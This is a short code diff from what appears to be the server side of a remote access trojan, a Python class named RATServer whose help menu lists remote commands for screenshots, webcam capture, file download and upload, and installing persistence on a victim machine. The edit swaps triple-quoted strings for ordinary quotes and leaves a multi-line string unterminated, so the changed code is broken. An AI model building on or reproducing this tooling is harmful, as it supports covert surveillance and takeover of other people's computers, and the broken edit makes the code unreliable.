@@ -387,7 +387,7 @@ class RATServer:
                 if cmd.lower() == 'exit':
                     break
                 elif cmd.lower() == 'help':
-                    help_msg = """Available commands:
+                    help_msg = "Available commands:
 1. sysinfo - System information
 2. screenshot - Take screenshot
 3. webcam - Capture webcam image
@@ -397,7 +397,7 @@ class RATServer:
 7. download <file> - Download file
 8. upload <file> <data> - Upload file
 9. persistence - Install persistence
-10. exit - Close connection"""
+10. exit - Close connection"
                     client_socket.send(help_msg.encode())
                 elif cmd.lower() == 'sysinfo':
                     info = f"""
